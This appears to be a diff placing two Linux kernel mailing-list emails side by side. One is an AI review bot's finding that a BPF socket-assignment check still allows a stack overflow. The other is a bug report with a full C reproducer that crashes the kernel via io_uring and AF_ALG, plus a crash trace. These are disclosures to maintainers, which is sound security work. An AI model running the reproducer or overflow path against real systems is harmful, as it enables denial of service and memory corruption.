@@ -1,136 +1,264 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3FF7C379966
-	for <bpf@vger.kernel.org>; Fri, 11 Sep 2026 17:42:58 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789148580; cv=none; b=KANro2QgOWLQDQoxKJP8WTNEGr18mPQleX5tK2FbDFGSZRs+qoLKDuXBzN/C82UzIfdKQNjNO7J5rXJiRJ+LVdJBQq6pQeyprfgwahT/XcPHXba9oU8n8yvvxrfTAbS/Id0Lc7e2nk8m+m1mDb9QBoqHg4J123mcrY3dFI1m/lw=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789148580; c=relaxed/simple;
-	bh=SzC+EkbzqSWeYDRJASLttJAK3/pHU9g9OhvXEg0bBRE=;
-	h=From:Subject:To:Cc:In-Reply-To:References:Content-Type:Date:
-	 Message-Id; b=fYef7R3glmO22Yj6ci1V/Rwtywqt++mzTdOpzhhsLBeTR8OeaGK/Gnh588k25AucKn4dcfNEn89kxQ7WiuNCocA/zI8W4VyfNDLXY3Pac839z5uqlzD3cPLgx17XszgnjnP+1vQKNEIifwlk6Eqvb0e04afqT/b87vJSLUYVOa8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=bHO1EPaw; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 26EF3486B8F
+	for <bpf@vger.kernel.org>; Fri, 11 Sep 2026 17:43:29 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.227.141
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1789148611; cv=pass; b=XmmlWnvtEqJxTqBBpKviQPQ5t/FeLpkzOzJYhhuJjHjJ28y/WhEcyJ7V0gSlhh2uBjepNz7JOjMxIdjjiiJrd01kYQOD90uvFvbHyhRM8gsArbkiqAJV3wB56sbx6ujeVejoJr400z5+GZZAvhm8tTZlp/wAtQC5Yi9dM+6zqOw=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1789148611; c=relaxed/simple;
+	bh=FjAxvxeArT6oGSMgJeJbHTSWRefCPbjzTtOgKthZtsY=;
+	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=sTOhGL2aFF3Ig+NLlakh5qjGT/X/xg4fiQrfyJX2BqeskkZqGaCJuTuui9ak9hxes5w9ywrv5wBfL9c+yC2eizYSX3GORZX+hpyGeg//kYOMq2dFvfDDwSKRsaH13hfHsfkWVIVId82qoKW/LQ0AqjqodVoF4xTrWu5W7I5jjfc=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com; spf=pass smtp.mailfrom=google.com; dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b=CQmtgcwE; arc=pass smtp.client-ip=74.125.227.141
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=google.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="bHO1EPaw"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id A064D1F000FF;
-	Fri, 11 Sep 2026 17:42:58 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
-	s=k20260515; t=1789148578;
-	bh=dYdhXjUOo7xVcCoDwzjMT8iFVC86ECmto4Rgj0bK4RQ=;
-	h=From:Subject:Reply-To:To:Cc:In-Reply-To:References:Date;
-	b=bHO1EPawN9bHUFNqQUylgXiTevUXza6tCEmAAbf+JxqHzW3GybVav1BR9bEB4GwN7
-	 xarEJTH6DNrT9s04WHK8oq1D89xpSBZ286AoNBflovLfOomueZrb5Kk6RtvHv37wDm
-	 kCPvy/SpzaDF2Azk1lHoyMAb3b7c6S0q1j+3c+IXdtschHj0lhlVx0P+eLyG3wEOC9
-	 LiA2Q1SbKwTEgr5STnwCn/lYjGMVwvUYm/ev0aVKOBdtbgD8kBn0+djns3GygiRP5p
-	 kPGR040AFKX41mkUehgZWwyQOa8pTytkWBr+dycUcsPAPQSR3K6L2IX7kb3xvOL0vf
-	 1794hqlJqRLWQ==
-From: sashiko-bot@kernel.org
-Subject: Re: [PATCH bpf v2 1/2] bpf: reject incompatible socket assignments
-Reply-To: sashiko-reviews@lists.linux.dev
-To: "Shihuang Liu" <shlomojune6@gmail.com>
-Cc: bpf@vger.kernel.org
-In-Reply-To: <20260911172313.64009-1-shlomojune6@gmail.com>
-References: <20260911172313.64009-1-shlomojune6@gmail.com>
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Date: Fri, 11 Sep 2026 17:42:58 +0000
-Message-Id: <20260911174258.A064D1F000FF@smtp.kernel.org>
+	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="CQmtgcwE"
+Received: by mail-pj2-f13.google.com with SMTP id d9443c01a7336-2d6ff390a6cso20855ad.1
+        for <bpf@vger.kernel.org>; Fri, 11 Sep 2026 10:43:29 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1789148609; cv=none;
+        d=google.com; s=arc-20260327;
+        b=Jfv/pTCXY3zX7NiD68npd/hB9v12XWNVJLyVmwR/UETSeUL09lIOXbGTlWFWngmFnV
+         fjVSeOyxvXO/LfTiWJd3emf0WSPiKbobhAzr3NNJugFISNnR+X9ybyXTI9wftSqZ7aTZ
+         QIS7TCAlXn/S/zMnbmWLBy7JqEMjS4jCn3aJuwUaZubb7pkB44Mq0HXR0FqkK5xKKtKo
+         OXZmcqzhZAZqMNyzPJHQmMxTJF+JM7HpAFnxoBAnM4fG1TMmGeQiCayaG2GN7Hs/4a+U
+         OeafGXhoc30/TmGpK76R8+LZSYUuZjicxzDnB0wG/fx+UUVoZBllQgOrwTqo6RxBxTcl
+         gnCg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
+        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
+        fh=oWsbqcH2PR3MtrL7Z/X3n2PZzvCpunAjDFbJNSTRq0U=;
+        b=Vit7I4l7TW9YGn3l25N6EG+7P0vQxAYCJZLhQJtNPfkpTzubzJi3L9k7b/am0yHfc5
+         xpTPIAySzX4I/z0VIlHGMJl1zroZIOqonw5ZmyEN4s6l1Vrl1TXI+Qjiz3WV2m9l7W4x
+         GqJWy5uZEIa5v1hq9UNwAFTqr8SZYqopc4SZBSAnpDG4dIzl6RkDdlMv49LnayoGBF7F
+         tRws/Fs7yEgu5RkIhgbsZwrHpTzVRDThps4UKzaNPjqe/ugvuRNbs4yCU5nKVfliTGW2
+         47vCsh4daeM1pyeD9Y1XvM6g/vepPwV9VI5oVijEYGI1SsOY74nAq1YOChl8n4HI7Fxu
+         ZWDg==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20251104; t=1789148609; x=1789753409; darn=vger.kernel.org;
+        h=content-type:cc:to:subject:message-id:date:from:mime-version:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
+        b=CQmtgcwEXtjJw/b/O33kch8EFg1Q4NIzOGw0ebbcIRIqFjL73yx4GBtxM+wM9Tkwk6
+         BNnqUwrV9VvA+e6CtDE4sdTPPo6YVrUYFETIYJH1+MHQYdoFPukaN8g2mdrV7nUUbpYZ
+         EmcGm5SqdMLqSa9s9jrks/ByvrqtTh/L/yWp2iczr1oNBSf2jGjz5vhfQd6PKLREiLLj
+         woQ1UaCl0384imXlbxSHksqbvcauPLnXUWvbyDYPmIAFK+BKWWYoEmLNY2E81Cp8SOh+
+         qV0p0ycozpVtfN5CWZuB1WKwvMLQ8IPLvnJc6Mg1JNdgQ8GJAT+0ahhHx8R1eit0yxDP
+         ZF5Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1789148609; x=1789753409;
+        h=content-type:cc:to:subject:message-id:date:from:mime-version
+         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to:content-type;
+        bh=r5WUKHjjmdQ6lLL56J9wrBm7xGwf/SHC1lNhlHRvsuE=;
+        b=ivbsB5iB4+MOJSRn87SFj7HLEUy9Y+AOG3tHdlV4rCfzF370vvqw25qTl0HJZCFFAY
+         WuuUt0zcKaB2v+Tj0y9t0LStx5LtHTGWdsWvTHTnWd8JqkTBlaBdEu44HxJw0FgzCSby
+         OenEOyPrVrPy05L5cp36flLfAJGYuAGEapogG4LfIBbo9rdfkGBPVqAUGP8gUC9WfBd+
+         TnbBfqH05RdxyXI+vDa4yhWw+jpQ/yr2ZDEpSBwUrBRRKDQUYpR/D1A4/JQw/1WUbqBG
+         OAldBpJeXlNzpnpTRBq326CS9ltul3rjUNxq4N5yLFYSGNZxEaF6jiZHiTThKpWfAAdj
+         cAJA==
+X-Forwarded-Encrypted: i=1; AKwUvBxsq7RksLEYsdQxGzlHufVfK4ckILRyUYwoUmhjxRUOyWdE8nRxAr4Rlb/cerO3OkOJI28=@vger.kernel.org
+X-Gm-Message-State: AFuF++kHMQbZyXiS8h+hKy3PHCY1SMxvScP4lVlZWtj0krNlJ12PI0o/
+	6HImMglgt0urzWq/XkT1/UcdNtjFOWEcKfnzrlIZoHey0biB6zHRPgu/NdO7njQK8dwqLm5qAvN
+	/B/QIu83j9jle6oChI61Z/bn5cX1S1lN4j6AWgDo1
+X-Gm-Gg: AYBFou0nKm/H/630J0E3O8jwH60WxAbHdKPjLErWeV3VzLDGcBwjK4eH3U5WDkGj7m8
+	lVeSN6QQKGbNm/fWACcND//QiI+2Ge10rkCB5ABHFxT1G1GlfWBAAXFNAJxxU22QnF/EIJDXxbH
+	HrgcldCMpOLCfgspn5Eqf+16/porzXbGQDDgdXXNETZORUPFS1M5DCWyhZ6hszjsbBrUq9Yc0T0
+	RhXkcBQHrsV76C1jI+GqYQE1ZuWjucKFmzZYYSrlzdSSre2R+V80jr/fpOeUet6GnTbP5Gh+Ue2
+	wkbwl9MO+yRP9QUBLIeDhNKlni8EWOfqllu21lhVzsUpatpPXaTaVIElg0CyWcAIlHwEwv9C+rx
+	GdBMJrrqhzO+HtP4pALAN3hOgdvpcPJffaHl7p2m5ZA==
+X-Received: by 2002:a17:903:90f:b0:2cf:4353:f117 with SMTP id
+ d9443c01a7336-2dd47920cc3mr593535ad.0.1789148608672; Fri, 11 Sep 2026
+ 10:43:28 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
+MIME-Version: 1.0
+From: Jann Horn <jannh@google.com>
+Date: Fri, 11 Sep 2026 19:42:50 +0200
+X-Gm-Features: AcwNN1UEsmAp1ZpjAO5SabZLRYOJVSonFCV3Y-4hFZyv2l_DuysDWBG1-5bTn4o
+Message-ID: <CAG48ez0XjVSR=M--UBauTm8sJuc+ZbhKzaPa3a6wrSVHyoKevw@mail.gmail.com>
+Subject: [BUG] lookup_user_key() calls commit_creds() (hitting BUG_ON() when
+ called from io_uring through AF_ALG setsockopt; BPF probably also affected)
+To: David Howells <dhowells@redhat.com>, Jarkko Sakkinen <jarkko@kernel.org>, keyrings@vger.kernel.org, 
+	Roberto Sassu <roberto.sassu@huawei.com>, Kumar Kartikeya Dwivedi <memxor@gmail.com>, Song Liu <song@kernel.org>, 
+	Alexei Starovoitov <ast@kernel.org>
+Cc: Herbert Xu <herbert@gondor.apana.org.au>, "David S. Miller" <davem@davemloft.net>, 
+	linux-crypto@vger.kernel.org, Jens Axboe <axboe@kernel.dk>, 
+	io-uring <io-uring@vger.kernel.org>, Daniel Borkmann <daniel@iogearbox.net>, 
+	Andrii Nakryiko <andrii@kernel.org>, Eduard Zingerman <eddyz87@gmail.com>, 
+	Martin KaFai Lau <martin.lau@linux.dev>, Yonghong Song <yonghong.song@linux.dev>, 
+	Jiri Olsa <jolsa@kernel.org>, Emil Tsalapatis <emil@etsalapatis.com>, 
+	Ihor Solodrai <ihor.solodrai@linux.dev>, bpf <bpf@vger.kernel.org>
+Content-Type: text/plain; charset="UTF-8"
 
-Thank you for your contribution! Sashiko AI review found 1 potential issue(=
-s) to consider:
+When lookup_user_key() is called on a special keyring ID
+(KEY_SPEC_*_KEYRING), it can end up calling commit_creds() on several
+codepaths:
 
-Pre-existing issues:
-- [Critical] The newly added bpf_sk_assign_family_ok() check fails to preve=
-nt assigning IPv6 packets to IPv4-mapped AF_INET6 sockets, allowing a bypas=
-s that triggers the original stack buffer overflow.
---
+lookup_user_key
+  install_thread_keyring [KEY_SPEC_THREAD_KEYRING + KEY_LOOKUP_CREATE]
+    commit_creds
+  install_process_keyring [KEY_SPEC_PROCESS_KEYRING + KEY_LOOKUP_CREATE]
+    commit_creds
+  join_session_keyring [KEY_SPEC_SESSION_KEYRING + KEY_LOOKUP_CREATE]
+    commit_creds
+  install_session_keyring [KEY_SPEC_SESSION_KEYRING]
+    commit_creds
 
-commit d0f229f5acd0292d1114ee92bd952f7af2a9e02f
-Author: Shihuang Liu <shlomojune6@gmail.com>
-Subject: bpf: reject incompatible socket assignments
+commit_creds() is only allowed when the process does not have
+overridden credentials. commit_creds() also requires that no
+non-refcounted pointers obtained from current_cred() are live in any
+callers.
 
-This commit rejects incompatible packet and socket families in bpf_sk_assig=
-n()
-and bpf_sk_assign_tcp_reqsk() to prevent a stack buffer overflow. It contin=
-ues
-to allow IPv4 packets to use dual-stack AF_INET6 sockets.
+lookup_user_key() is used by lots of keyctl operations, where it can
+make sense to refer to special keyring IDs; but it is also used by
+other subsystems (such as AF_ALG, nvdimm, fscrypt, BPF, ...) to look
+up user-specified key IDs. In that case, special keyring IDs don't
+make sense (because they refer to keyrings, not individual
+cryptographic keys), and calling commit_creds() is unsafe.
 
-Link: https://lore.kernel.org/netdev/20260823101809.26802-1-shlomojune6@gma=
-il.com/
+It would be nice if we could ensure that commit_creds() can only be
+called when KEY_LOOKUP_CREATE is set (which is only used for special
+key IDs); maybe we could replace the
+install_session_keyring(user_session) call with something that just
+grabs a reference to the session keyring and returns it?
 
-> diff --git a/net/core/filter.c b/net/core/filter.c
-> index cae43b9991627..b5452113f974a 100644
-> --- a/net/core/filter.c
-> +++ b/net/core/filter.c
-[ ... ]
-> @@ -3491,6 +3491,32 @@ static int bpf_skb_proto_xlat(struct sk_buff *skb,=
- __be16 to_proto)
-[ ... ]
-> +static bool bpf_sk_assign_family_ok(const struct sk_buff *skb,
-> +				    const struct sock *sk)
-> +{
-> +	unsigned short family;
-> +
-> +	switch (skb->protocol) {
-> +	case htons(ETH_P_IP):
-> +		family =3D AF_INET;
-> +		break;
-> +	case htons(ETH_P_IPV6):
-> +		family =3D AF_INET6;
-> +		break;
-> +	default:
-> +		return true;
-> +	}
-> +
-> +	/* Requests inherit the listener family, but have family-specific ops. =
-*/
-> +	if (sk->sk_state =3D=3D TCP_NEW_SYN_RECV)
-> +		return inet_reqsk(sk)->rsk_ops->family =3D=3D family;
-> +
-> +	return sk->sk_family =3D=3D family ||
-> +	       (family =3D=3D AF_INET &&
-> +		sk->sk_family =3D=3D AF_INET6 &&
-> +		!ipv6_only_sock(sk));
-> +}
+I made a reproducer for the lookup_user_key() call in AF_ALG, but I
+think several other callers of lookup_user_key() are probably also
+affected, like bpf_lookup_user_key() and nvdimm_lookup_user_key().
 
-[Severity: Critical]
-This is a pre-existing issue, but does this logic still allow a bypass that
-triggers the original stack buffer overflow when handling dual-stack AF_INE=
-T6
-child sockets?
+bpf_lookup_user_key() will probably require separate fixing; it seems
+to be intentionally designed to be able to look up and create special
+key IDs, but is part of the generic_kfunc_set kfunc set, which can
+probably run in some contexts with overridden creds, like in arbitrary
+LSM hooks. That seems inherently broken.
 
-If a dual-stack AF_INET6 listening socket accepts an IPv4 connection, it
-creates a child socket with sk_family =3D AF_INET6 and sk_backlog_rcv =3D
-tcp_v4_do_rcv.
+Reproducer
+==========
+As an example, when I use io_uring with ->personality to indirectly
+call setsockopt(af_alg_sock, SOL_ALG, ALG_SET_KEY_BY_KEY_SERIAL,
+&KEY_SPEC_SESSION_KEYRING, sizeof(int)), the kernel will go down the
+following call graph.
 
-If a malicious IPv6 packet is assigned to this IPv4-mapped child socket usi=
-ng
-a TC BPF program, bpf_sk_assign_family_ok() evaluates to true because both =
-the
-packet and the socket report AF_INET6, incorrectly allowing the assignment.
+sys_io_uring_enter
+  io_submit_sqes
+    io_submit_sqe
+      io_init_req
+        [set REQ_F_CREDS if sqe->personality is set]
+      io_queue_sqe
+        io_issue_sqe
+          __io_issue_sqe
+            override_creds [if REQ_F_CREDS is set and creds differ]
+            io_uring_cmd
+              io_uring_cmd_sock
+                io_uring_cmd_setsockopt
+                  do_sock_setsockopt
+                    alg_setsockopt
+                      alg_setkey_by_key_serial
+                        lookup_key
+                          lookup_user_key
+                            install_session_keyring
+                              commit_creds
+                                BUG_ON(task->cred != old)
+            revert_creds
 
-If the socket is locked by userspace, the packet gets queued to the backlog.
-Upon unlock, release_sock() calls the socket's backlog handler,
-tcp_v4_do_rcv(), to process the IPv6 packet.
+Running this reproducer:
 
-If tcp_v4_do_rcv() rejects the packet (for example, due to out-of-order data
-on a half-closed socket), it jumps to the reset label and calls
-tcp_v4_send_reset(), which unconditionally passes the IPv4 options offset to
-ip_send_unicast_reply() and __ip_options_echo().
+#define _GNU_SOURCE
+#include <err.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <linux/if_alg.h>
+#include <linux/io_uring.h>
+#include <linux/keyctl.h>
 
-Since the packet was originally processed as IPv6, the control block contai=
-ns
-h6 data instead of IPv4 options. Attacker-controlled IPv6 extension headers
-can overlay the IPv4 option offsets, which causes __ip_options_echo() to
-execute an out-of-bounds memcpy into a stack buffer.
+#define SYSCHK(x) ({          \
+  typeof(x) __res = (x);      \
+  if (__res == (typeof(x))-1) \
+    err(1, "SYSCHK(" #x ")"); \
+  __res;                      \
+})
 
---=20
-Sashiko AI review =C2=B7 https://sashiko.dev/#/patchset/20260911172313.6400=
-9-1-shlomojune6@gmail.com?part=3D1
+int main(void) {
+  int alg_sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
+  struct sockaddr_alg addr = {
+    .salg_family = AF_ALG,
+    .salg_type = "hash",
+    .salg_name = "sha1"
+  };
+  SYSCHK(bind(alg_sock, (struct sockaddr *)&addr, sizeof(addr)));
+
+  struct io_uring_params params = { .flags = IORING_SETUP_NO_SQARRAY };
+  int uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/4, &params));
+
+  // let io_uring grab a reference to the current creds
+  int personality = SYSCHK(syscall(__NR_io_uring_register, uring_fd,
+IORING_REGISTER_PERSONALITY, NULL, 0));
+  // change our creds so that the io_uring personality is different
+from current creds
+  SYSCHK(syscall(__NR_keyctl, KEYCTL_GET_KEYRING_ID,
+KEY_SPEC_SESSION_KEYRING, 0, 0, 0));
+
+  char *ring_region = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
+  struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000,
+PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));
+
+  int key_serial = KEY_SPEC_SESSION_KEYRING;
+  sqes[0] = (struct io_uring_sqe) {
+    .opcode = IORING_OP_URING_CMD,
+    .fd = alg_sock,
+    .personality = personality,
+
+    /* specific to uring_cmd */
+    .cmd_op = SOCKET_URING_OP_SETSOCKOPT,
+    .optname = ALG_SET_KEY_BY_KEY_SERIAL,
+    .optval = (unsigned long)&key_serial,
+    .optlen = sizeof(key_serial),
+    .level = SOL_ALG,
+  };
+  (*(unsigned int *)(ring_region + params.sq_off.tail))++;
+
+  int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd,
+                                   /*to_submit=*/1, /*min_complete=*/1,
+                                   /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0));
+  printf("submitted %d and completed\n", submitted);
+}
+
+
+I get this splat:
+
+[  543.190354][  T111] kernel BUG at kernel/cred.c:376!
+[...]
+[  543.196705][  T111] Call Trace:
+[...]
+[  543.197319][  T111]  lookup_user_key+0x261/0xbe0
+[...]
+[  543.197869][  T111]  alg_setkey_by_key_serial+0xbc/0x300
+[  543.198153][  T111]  alg_setsockopt+0x1a2/0x2a0
+[...]
+[  543.198610][  T111]  do_sock_setsockopt+0x103/0x130
+[  543.198863][  T111]  io_uring_cmd_sock+0x257/0x8b0
+[...]
+[  543.199608][  T111]  io_uring_cmd+0x1f3/0x2a0
+[...]
+[  543.200103][  T111]  __io_issue_sqe+0xd8/0x2a0
+[  543.200335][  T111]  io_issue_sqe+0xde/0x8c0
+[...]
+[  543.201100][  T111]  io_submit_sqes+0x7a6/0x1060
+[  543.201380][  T111]  __se_sys_io_uring_enter+0x218/0xf40
+[...]
+[  543.202158][  T111]  __x64_sys_io_uring_enter+0x82/0xa0
+[...]
+[  543.202780][  T111]  x64_sys_call+0x175f/0x2600
+[  543.203086][  T111]  do_syscall_64+0xbe/0x360
+[  543.203348][  T111]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
